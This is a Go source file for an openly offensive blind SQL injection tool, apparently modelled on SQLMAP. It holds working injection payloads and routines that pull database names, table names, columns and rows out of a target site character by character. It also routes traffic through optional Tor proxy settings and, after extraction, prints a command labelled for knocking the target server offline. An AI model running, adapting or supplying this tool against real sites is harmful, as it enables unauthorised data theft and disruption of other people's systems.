// rewritten and improoved code
//
//
// Re Designer author => ArkAngeL43
// Forked version     => i got the general idea from SQLMAP, accept in go
// Type               => Offensive Security
// Type of attack     => Blind based SQL injection
// Found from         => Some random ass forum built in the early 2000's XD sorry not sorry cant credit anon users

//
//
// TO CHANGE:
//         Change color output
//         Format output
//         Add options for tor routers/nodes
//         Add a network tester
//         Change amount of usage in third party libs
//         Convert banner into a file
//         Make flags instead of third party args
//         Make GET request before attacking target
//         Test the URL for params, and vulnerabilities before using blind injection
//         Add time logger
//         Add options to log data to a File
//         Add easier flags and help menus
//         Add better and more desireable inputs
//         change the f ton amount of unused return functions or unreachable statements
//         Utilize go concurrency
//         Change info that goes into the variable names
//         Remove and change redundant structs
//         Add err handeler
//         Add sig handeler
//         Add color module
//         Remove scanln functions and use bufio
//         Check tor stats IF USED
//         Simplify expression types
//         Add boolean return function for needed
//         Add if else statements under for loops
//
//
//
// Generally speaking what is this?
//
// This is a rebuild of someone elses tool that i saw i could modify, with also
// it being completely forked ideas from SQLMAP, where the output kinda is different
// while also writing data to a file and getting the data to output
//
// today i kinda thought of the idea of making a tool called DROP KICKED which was going
// to SQL inject and execute command queries which will drop all tables in the database
// note when i first downloaded this script it was very slow, as of writing i still cant figure
// out why it is so extremely slow

package main

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/alexflint/go-arg"
	"github.com/bndr/gotabulate"
	"github.com/k3a/html2text"
)

var (
	proxy string = "socks5://127.0.0.1:9050"
	// unix AF standard socks5 portaddr
	AFUNIX_socket string = "socks5://127.0.0.1:9150"
	returnback           = "\033[0;49m"
	returnfore           = "\033[0;39m"
	t                    = time.Now()
	th                   = t.Hour()
	tm                   = t.Minute()
	ts                   = t.Second()
	BLK                  = "\033[0;30m"
	RED                  = "\033[0;31m"
	GRN                  = "\033[0;32m"
	YEL                  = "\033[0;33m"
	BLU                  = "\033[0;34m"
	MAG                  = "\033[0;35m"
	CYN                  = "\033[0;36m"
	WHT                  = "\033[0;37m"
	BBLK                 = "\033[1;30m"
	BRED                 = "\033[1;31m"
	BGRN                 = "\033[1;32m"
	BYEL                 = "\033[1;33m"
	BBLU                 = "\033[1;34m"
	BMAG                 = "\033[1;35m"
	BCYN                 = "\033[1;36m"
	BWHT                 = "\033[1;37m"
	UBLK                 = "\033[4;30m"
	URED                 = "\033[4;31m"
	UGRN                 = "\033[4;32m"
	UYEL                 = "\033[4;33m"
	UBLU                 = "\033[4;34m"
	UMAG                 = "\033[4;35m"
	UCYN                 = "\033[4;36m"
	UWHT                 = "\033[4;37m"
	BLKB                 = "\033[40m"
	REDB                 = "\033[41m"
	GRNB                 = "\033[42m"
	YELB                 = "\033[43m"
	BLUB                 = "\033[44m"
	MAGB                 = "\033[45m"
	CYNB                 = "\033[46m"
	WHTB                 = "\033[47m"
	BLKHB                = "\033[0;100m"
	REDHB                = "\033[0;101m"
	GRNHB                = "\033[0;102m"
	YELHB                = "\033[0;103m"
	BLUHB                = "\033[0;104m"
	MAGHB                = "\033[0;105m"
	CYNHB                = "\033[0;106m"
	WHTHB                = "\033[0;107m"
	HBLK                 = "\033[0;90m"
	HRED                 = "\033[0;91m"
	HGRN                 = "\033[0;92m"
	HYEL                 = "\033[0;93m"
	HBLU                 = "\033[0;94m"
	HMAG                 = "\033[0;95m"
	HCYN                 = "\033[0;96m"
	HWHT                 = "\033[0;97m"
	BHBLK                = "\033[1;90m"
	BHRED                = "\033[1;91m"
	BHGRN                = "\033[1;92m"
	BHYEL                = "\033[1;93m"
	BHBLU                = "\033[1;94m"
	BHMAG                = "\033[1;95m"
	BHCYN                = "\033[1;96m"
	BHWHT                = "\033[1;97m"
	ch                   = "\x1b[H\x1b[2J\x1b[3J"
	input         string
)

// Options : Ayarlar
var Options struct {
	Parameter       string
	ParameterValue  string
	URL             *url.URL
	firstLen        int
	Payload         int
	DBNameLen       int
	DBName          string
	DBTableCount    int
	DBTablesColumns map[string][]string
	DBTablesRows    map[int][]string
}

var args struct {
	URL string `arg:"required"`
}

var Payloads = map[int]string{
	1: "' AND '1' = '1",
	2: "' AND '1' = '1'",
	3: " AND '1' = '1'",
	4: " AND 1 = 1",
	5: " AND 1 = 1'",
	6: "'AND 1 = 1'",
}

var NegativePayloads = map[int]string{
	1: "' AND '1' = '2",
	2: "' AND '1' = '2'",
	3: " AND '1' = '2'",
	4: " AND 1 = 2",
	5: " AND 1 = 2'",
	6: "'AND 1 = 2'",
}

var ErrPayloads = []string{
	"Fatal error:",
	"error in your SQL syntax",
	"mysql_num_rows()",
	"mysql_fetch_array()",
	"Error Occurred While Processing Request",
	"Server Error in '/' Application",
	"mysql_fetch_row()",
	"Syntax error",
	"mysql_fetch_assoc()",
	"mysql_fetch_object()",
	"mysql_numrows()",
	"GetArray()",
	"FetchRow()",
	"Input string was not in a correct format",
	"You have an error in your SQL syntax",
	"Warning: session_start()",
	"Warning: is_writable()",
	"Warning: Unknown()",
	"Warning: mysql_result()",
	"Warning: mysql_query()",
	"Warning: mysql_num_rows()",
	"Warning: array_merge()",
	"Warning: preg_match()",
	"SQL syntax error",
	"MYSQL error message: supplied argument….",
	"mysql error with query",
}

var Characters = []string{
	"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "_", "", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "@", ".",
}

func cher(err error, msg string) bool {
	if err != nil {
		log.Fatal(err, msg)
		return true
	}
	return false
}

///
///
/// banner
func banner(file, color string) {
	content, err := ioutil.ReadFile(file)
	cher(err, "[ DATA ] FATAl:WARN: Could not open file")
	fmt.Println(color, string(content))
}

// line seperation
func sep(line string) {
	fmt.Print(line)
}

///
///
///  Network check
func checkcon(url string) bool {
	httpg, err := http.Get(url)
	cher(err, "[ INFO ] WARN: FATAL: Offline? Could not finish or make get request")
	if httpg.StatusCode >= 200 {
		fmt.Print(returnfore, "[", BLU, th, ":", tm, ":", ts, returnfore+"]"+"  ["+BLU+"INFO"+returnfore+"] CONNECTED: HTTP Status > ", WHT, "[ ", BLU, httpg.StatusCode, WHT, " ]", returnfore)
		sep("\n")
		return false
	} else {
		if httpg.StatusCode <= 100 {
			fmt.Println(returnfore, "[", BLU, t.Hour(), ":", t.Minute(), ":", t.Second(), returnfore, "]", "   [", RED, "WARN", returnfore, "] HTTP CODE: GOT BAD HTTP Status code > ", WHT, "[ ", RED, httpg.StatusCode, WHT, " ]", returnfore)

			return false
		}
	}
	return true
}

func BIG_RED_BUTTON(ip string) {
	command := "sudo perl get.pl 1.1.1.1 " + ip
	fmt.Println("\n\n\n please now enter this command in your terminal ")
	row_1 := []interface{}{command}
	t := gotabulate.Create([][]interface{}{row_1})
	t.SetHeaders([]string{"COMMAND TO KICK DROP SERVER"})
	t.SetEmptyString("None")
	t.SetAlign("right")
	fmt.Println(t.Render("grid"))
	os.Exit(0)
}

func chaos(url string) {
	fmt.Print(returnfore, "[", BLU, th, ":", tm, ":", ts, returnfore+"]"+"  ["+BLU+"WARNING"+returnfore+"] ", WHT, "[ ", BRED, "WARNING ATTACK INITATION", WHT, " ]", returnfore, " DROPPING SERVER IN 10 SECONDS\n")

	time.Sleep(10 * time.Second)
	findomain := regexp.MustCompile(`\.?([^.]*.com)`)
	fmt.Println(findomain.FindStringSubmatch(url)[1])
	domainfinal := findomain.FindStringSubmatch(url)[1]
	ips, err := net.LookupIP(domainfinal)
	cher(err, "Could not get IPA of domain name")
	for _, ip := range ips {
		fmt.Print(returnfore, "[", BLU, th, ":", tm, ":", ts, returnfore+"]"+"  ["+BLU+"WARNING"+returnfore+"] ", WHT, "[ ", BRED, "WARNING ATTACK INITATION", WHT, " ]", returnfore, " DROPPING SERVER.............\n")
		fmt.Printf("domain IP => %s ", ip.String())
		BIG_RED_BUTTON(ip.String())
	}

}

func checktor(webname, proxyname string) {
	// make a standard get request to check tor IP through APIFYIP to verify IPA
	//
	// tor settings
	torProxyUrl, err1 := url.Parse(proxyname)
	// err
	cher(err1, "COULD NOT PARSE SOCKS ADDR")
	torTransport := &http.Transport{Proxy: http.ProxyURL(torProxyUrl)}
	client := &http.Client{Transport: torTransport, Timeout: time.Second * 10}
	responsetor, err := client.Get(webname)
	cher(err, "COULD NOT USE CLIENT WITH TOR TO MAKE GET REQUEST!!!")
	ipa, err3 := ioutil.ReadAll(responsetor.Body)
	cher(err3, "could not read response from tor")
	fmt.Print(returnfore, "[", BLU, th, ":", tm, ":", ts, returnfore+"]"+"  ["+BLU+"INFO"+returnfore+"] CONNECTED: HTTP Status  > ", WHT, "[ ", BLU, responsetor.StatusCode, WHT, " ]", returnfore, "\n")
	fmt.Print(returnfore, "[", BLU, th, ":", tm, ":", ts, returnfore+"]"+"  ["+BLU+"INFO"+returnfore+"] CONNECTED: TOR  IP_ADDR > ", WHT, "[ ", BLU, ipa, WHT, " ]", returnfore, "\n")
	fmt.Print(returnfore, "[", BLU, th, ":", tm, ":", ts, returnfore+"]"+"  ["+BLU+"INFO"+returnfore+"] CONNECTED: TOR  SOCKET  > ", WHT, "[ ", BLU, proxyname, WHT, " ]", returnfore, "\n")

}

func main() {
	fmt.Println(ch)
	banner("banner.txt", BLU)
	// check connection
	checkcon("http://www.google.com")
	// check tor connection
	//checktor("https://api.ipify.org?format=text", proxy)
	//
	arg.MustParse(&args)
	Options.URL, _ = url.Parse(args.URL)                //URL Kaydediliyor
	Options.firstLen = getPageLen(Options.URL.String()) //Sayfanın boyutu kaydediliyor
	Options.DBTablesColumns = make(map[string][]string)
	Options.DBTablesRows = make(map[int][]string)
	setParameter() //Taranacak parametre kullanıcıdan isteniyor, değeri kaydediliyor
	switch getPwnType() {
	case "len":
		fmt.Print(returnfore, "[", BLU, th, ":", tm, ":", ts, returnfore+"]"+"  ["+BLU+"INFO"+returnfore+"] LENGTH BASED DETECTION > ", WHT, "[ ", BLU, "TRUE", WHT, " ]", returnfore, "\n")
		fmt.Print(returnfore, "[", BLU, th, ":", tm, ":", ts, returnfore+"]"+"  ["+BLU+"DATA"+returnfore+"] Injecting Target At    > ", WHT, "[ ", BLU, args.URL, WHT, " ]", returnfore, "\n")
		inject("len")
	case "err":
		fmt.Print(returnfore, "[", BLU, th, ":", tm, ":", ts, returnfore+"]"+"  ["+BLU+"INFO"+returnfore+"] ERROR BASED DETECTION > ", WHT, "[ ", BLU, "TRUE", WHT, " ]", returnfore, "\n")
		inject("err")
	case "between":
		fmt.Println("Please choose attack method, type 'len' or 'err'")
		fmt.Scanln(&input)
		if strings.EqualFold(input, "blind") == true {
			inject(input)
		}

	}

	if test("'", "len") == 1 {
		fmt.Println("Error Based SQL Inj: YES")
		fmt.Println("[ - ] Tests might return false, exiting.....")
	}

}
func inject(method string) {
	fmt.Print(returnfore, "[", BLU, th, ":", tm, ":", ts, returnfore+"]"+"  ["+BLU+"INFO"+returnfore+"] Testing Current MySQL Payloads....", returnfore, "\n")
	for k, v := range Payloads {
		if test(v, method) == 1 {
			fmt.Print(returnfore, "[", BLU, th, ":", tm, ":", ts, returnfore+"]"+"  ["+BLU+"INFO"+returnfore+"] Testing Payload > ", WHT, "[ ", BLU, v, WHT, " ]", returnfore, "\n")
			Options.Payload = k
			if test(NegativePayloads[Options.Payload], method) == 0 {
				fmt.Print(returnfore, "[", BLU, th, ":", tm, ":", ts, returnfore+"]"+"  ["+BLU+"INFO"+returnfore+"] PAYLOAD CAME BACK >  ", WHT, "[ ", BLU, "SUCESSFUL", WHT, " ]", returnfore, "\n")
				getDBNameLen(method)
				getDBName(method)
				getDBTableCount(method)
				getDBTables(method)
				fmt.Println("finished gathering at => ", time.Now())
				chaos(args.URL)
				break
			} else {
				fmt.Print(returnfore, "[", BLU, th, ":", tm, ":", ts, returnfore+"]"+"  ["+BHRED+"WARN"+returnfore+"] PAYLOAD CAME BACK >  ", WHT, "[ ", BHRED, "FALSE", WHT, " ]", returnfore, "\n")

				fmt.Println("Payload unsuccesful, trying another payload")
			}
		}
	}
}

func getDBNameLen(method string) {
	fmt.Print(returnfore, "[", BLU, th, ":", tm, ":", ts, returnfore+"]"+"  ["+BLU+"INFO"+returnfore+"] Getting Database Name Length .....", returnfore, "\n")
	for i := 1; i < 32; i++ {
		query := Query("AND (SELECT LENGTH(database()))=" + strconv.Itoa(i))
		if test(query, method) == 1 {
			Options.DBNameLen = i
			fmt.Print(returnfore, "[", BLU, th, ":", tm, ":", ts, returnfore+"]"+"  ["+GRN+"DATA"+returnfore+"] GET DATABASE NAME LEN: SUCCESS => ", i, returnfore, "\n")
			break
		}
	}

}
func getDBName(method string) {
	fmt.Print(returnfore, "[", BLU, th, ":", tm, ":", ts, returnfore+"]"+"  ["+BLU+"INFO"+returnfore+"] Getting Database Name.......", returnfore, "\n")
	fmt.Print(returnfore, "[", BLU, th, ":", tm, ":", ts, returnfore+"]"+"  ["+GRN+"DATA"+returnfore+"] DATABASE FULL NAME     \033[31m => ")
	char := 1
	for {
		for _, value := range Characters {
			query := Query("AND (substring(database()," + strconv.Itoa(char) + ",1))='" + value + "'")
			if test(query, method) == 1 {
				char++
				Options.DBName += value
				fmt.Print(value)
				break
			}
		}
		if char == (Options.DBNameLen + 1) {
			fmt.Println("")
			fmt.Print(returnfore, "[", BLU, th, ":", tm, ":", ts, returnfore+"]"+"  ["+GRN+"FOUND"+returnfore+"] DATABASE Name     \033[31m => ", Options.DBName)
			fmt.Println("")
			break
		}
	}
}

func getDBTableCount(method string) {
	i := 0
	for {
		query := Query("AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=" + strconv.Itoa(i))
		if test(query, method) == 1 {
			fmt.Print(returnfore, "[", BLU, th, ":", tm, ":", ts, returnfore+"]"+"  ["+GRN+"DATA"+returnfore+"] TABLE COUNT \033[31m => ", i, "\n")
			Options.DBTableCount = i
			break
		}
		i++

	}
}

func getDBTables(method string) {
	char := 1
	table := 0
	tableName := ""
	for {
		for _, value := range Characters {
			query := Query("and substring((SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit " + strconv.Itoa(table) + ",1)," + strconv.Itoa(char) + ",1)='" + value + "'")
			if test(query, method) == 1 {
				char++
				tableName += value
				fmt.Print(value)
				if value == "" {
					fmt.Print("\n", returnfore, "[", BLU, th, ":", tm, ":", ts, returnfore+"]"+"  ["+GRN+"DOWNLOAD ", (table + 1), returnfore+"] TABLE OWNED \033[31m => ", tableName, "\n")
					row_1 := []interface{}{tableName}
					t := gotabulate.Create([][]interface{}{row_1})
					t.SetHeaders([]string{"Name"})
					t.SetEmptyString("None")
					t.SetAlign("right")
					fmt.Println(t.Render("grid"))
					fmt.Print(returnfore, "[", BLU, th, ":", tm, ":", ts, returnfore+"]"+"  ["+GRN+"DATA"+returnfore+"] TO OWN/RETRIEVE     \033[31m => ")

					char = 1
					Options.DBTablesColumns[tableName] = []string{}
					tableName = ""
					table++
				}
			}
		}
		if Options.DBTableCount == table {
			break
		}
	}
}
func getDBColumnLen(method string, tableName string) int {
	fmt.Print(returnfore, "[", BLU, th, ":", tm, ":", ts, returnfore+"]"+"  ["+GRN+"DATA"+returnfore+"] Gathering column count => ", tableName)
	for i := 1; i < 32; i++ {
		query := Query("AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND table_name='" + tableName + "')=" + strconv.Itoa(i))
		if test(query, method) == 1 {
			fmt.Print(returnfore, "[", BLU, th, ":", tm, ":", ts, returnfore+"]"+"  ["+GRN+"DATA"+returnfore+"] FOUND NUMBER OF COLUMNS TO => ", tableName)
			row_1 := []interface{}{i}
			t := gotabulate.Create([][]interface{}{row_1})
			t.SetHeaders([]string{"Number of possible coulums"})
			t.SetEmptyString("None")
			t.SetAlign("right")
			fmt.Println("\n", t.Render("grid"))
			return i
		}
	}
	return 0
}

//tbl_admin
func getDBColumns(method string, tableName string) {
	fmt.Print(returnfore, "[", BLU, th, ":", tm, ":", ts, returnfore+"]"+"  ["+GRN+"INFO"+returnfore+"] Gathering colums of table ", tableName)

	columnLen := getDBColumnLen(method, tableName)
	char := 1
	column := 0
	columnName := ""
	for {
		for _, a := range Characters {
			//query1 := generatePwnQuery("AND (substr((SELECT * FROM information_schema.columns WHERE table_schema = database() AND table_name ='" + tableName + "' LIMIT " + strconv.Itoa(column) + ",1)," + strconv.Itoa(char) + ",1)) = '" + a + "'")
			//query := generatePwnQuery("AND (substr((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='" + tableName + "'")
			//fmt.Println("pwn query generated")
			//query := Query("AND (substr((select * from information_schema.columns where table_schema = database() and table_name ='" + tableName + "' LIMIT " + strconv.Itoa(column) + ",1)," + strconv.Itoa(char) + ",1)) = '" + a + "'")
			query := Query("AND (substr((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='" + tableName + "' LIMIT " + strconv.Itoa(column) + ",1)," + strconv.Itoa(char) + ",1)) = '" + a + "'")
			if test(query, method) == 1 {
				char++
				columnName += a

				if a == "" {
					//row_1 := []interface{}{}
					//t := gotabulate.Create([][]interface{}{row_1})
					//t.SetHeaders([]string{"Name"})
					//t.SetEmptyString("None")
					//t.SetAlign("right")
					//fmt.Println(t.Render("grid"))
					char = 1
					Options.DBTablesColumns[tableName] = append(Options.DBTablesColumns[tableName], columnName)
					columnName = ""
					column++
					char++
				}
				char++
			}
		}
		if column == columnLen {
			break
		}
	}
}

func getDBRowCount(method string, tableName string, column string) int {
	i := 0
	for {
		query := Query("AND (SELECT COUNT(*) FROM " + tableName + ") = " + strconv.Itoa(i))
		if test(query, method) == 1 {
			return i
		}
		i++
	}
	return 0
}
func getDBRowColumn(method string, tableName string, column string, row int) string {
	fmt.Println("getting tables")
	char := 1
	rowData := ""
	for {
		for _, a := range Characters {
			query := Query("and substring((Select " + column + " from " + tableName + " limit " + strconv.Itoa(row) + ",1)," + strconv.Itoa(char) + ",1)='" + a + "'")
			if test(query, method) == 1 {
				rowData += a
				char++
				if a == "" {
					return rowData
				}
			}
		}

	}
}

func test(query string, method string) int {
	switch method {
	case "len":

		u := *Options.URL
		q := u.Query()
		q.Set(Options.Parameter, Options.ParameterValue+query)
		u.RawQuery = q.Encode()
		secondLen := getPageLen(u.String())
		//fmt.Println(query)
		if Options.firstLen == secondLen {
			return 1
		}
		return 0
	case "err":
		u := *Options.URL
		q := u.Query()
		q.Set(Options.Parameter, Options.ParameterValue+query)
		u.RawQuery = q.Encode()
		html := getPageHTML(u.String())
		for _, valueErr := range ErrPayloads {
			if !strings.Contains(html, valueErr) {
				return 1
			}
		}
		return 0
	}
	return 0
}

func getPageLen(pageURL string) int {
	html := getPageHTML(pageURL)
	if strings.Contains(html, "<head>") {
		afterHeadHTML := strings.SplitAfter(string(html), "<head>")
		plain := html2text.HTML2Text(afterHeadHTML[1])
		return len(plain)
	}
	return len(html)
}

func getPageHTML(pageURL string) string {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	resp, err := http.Get(pageURL)
	if resp.StatusCode == 403 {
		fmt.Println("WAF")
	}
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	html, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	return string(html)
}

func setParameter() {
	parameters := map[int]string{}
	q, _ := url.ParseQuery(Options.URL.RawQuery)
	i := 0
	for k, _ := range q {
		i++
		parameters[i] = k
	}
	for k, v := range parameters {
		row_1 := []interface{}{k, v}
		t := gotabulate.Create([][]interface{}{row_1})
		t.SetHeaders([]string{"Number", "Paramater"})
		t.SetEmptyString("None")
		t.SetAlign("right")
		fmt.Println(t.Render("grid"))
		//color.Yellow("[" + strconv.Itoa(k) + "] " + v)
	}
	// value for asking user to set paramaters
	fmt.Print(returnfore, "[", BLU, th, ":", tm, ":", ts, returnfore+"]"+"  ["+BLU+"INFO"+returnfore+"] Found PARAMATERS to target, please enter the following number which you want to use ( EX: 1)", returnfore, "\n")
	var input int
	fmt.Scanln(&input)
	Options.Parameter = parameters[input]
	Options.ParameterValue = q.Get(parameters[input])

}

func getPwnType() string {
	if test("'", "len") == 0 && test("'", "err") == 0 {
		return "between"
	}
	if test("'", "len") == 0 {
		return "len"
	}
	if test("'", "err") == 0 {
		return "err"
	}
	return "none"
}

func Query(query string) string {
	splitPayload := strings.Split(Payloads[Options.Payload], "AND")
	generatedPayload := splitPayload[0] + query + " AND" + splitPayload[1]
	return generatedPayload
}
